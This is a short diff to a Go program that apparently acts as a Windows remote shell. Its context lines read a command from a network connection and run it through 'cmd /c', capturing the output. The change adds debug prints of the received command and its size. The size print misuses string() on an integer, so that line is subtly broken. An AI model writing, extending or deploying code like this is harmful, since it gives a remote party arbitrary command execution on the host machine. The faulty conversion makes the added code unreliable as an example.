@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"net"
 	"os/exec"
 )
@@ -28,6 +29,9 @@ func main() {
 		if err == nil {
 
 			cmd := string(buff[:size])
+
+			fmt.Println("Command: " + cmd)
+			fmt.Println("Size: " + string(size))
 
 			// exec the command
 			out, err := exec.Command("cmd", "/c", cmd).CombinedOutput()
